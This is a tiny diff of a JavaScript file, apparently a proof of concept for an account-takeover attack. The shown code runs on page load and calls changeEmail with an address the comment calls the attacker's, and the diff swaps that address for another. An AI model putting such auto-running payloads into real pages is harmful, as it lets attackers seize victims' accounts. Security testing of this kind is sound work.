@@ -35,6 +35,6 @@ $(document).ready(function() {
     }
     
     // triggering change email with the attacker's email address
-    changeEmail("s4ur4bh.1337@gmail.com");
+    changeEmail("s4ur4bh.1337.attacker@gmail.com");
     
 });
